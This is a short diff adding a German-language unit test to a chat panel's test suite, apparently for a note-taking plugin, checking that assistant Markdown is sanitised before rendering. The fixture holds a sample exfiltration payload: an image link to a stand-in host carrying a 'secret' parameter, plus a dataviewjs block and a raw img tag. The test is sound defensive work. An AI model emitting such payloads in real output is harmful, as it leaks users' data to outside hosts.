@@ -201,6 +201,20 @@ describe('KuroChatPanel', () => {
       expect(texts[1].classes.has('markdown-rendered')).toBe(true);
     });
 
+    it('entschärft Modell-Markdown vor dem Rendern fertiger Antworten (Bild, dataviewjs, HTML)', () => {
+      const s = new ChatSession();
+      const evil = '![x](https://evil.example/?d=geheim)\n\n```dataviewjs\ndv.view()\n```\n\n<img src=x>';
+      s.append({ role: 'assistant', text: evil });
+      const m = md();
+      const { panel } = makePanel(s, { renderMarkdown: m.renderMarkdown });
+      panel.render();
+      expect(m.calls).toHaveLength(1);
+      expect(m.calls[0]).not.toContain('![');
+      expect(m.calls[0]).not.toContain('```');
+      expect(m.calls[0]).not.toContain('<img');
+      expect(m.calls[0]).toContain('&lt;img');
+    });
+
     it('zeigt den Rohtext, wenn das Rendern scheitert', async () => {
       const s = new ChatSession();
       s.append({ role: 'assistant', text: '**fett**' });
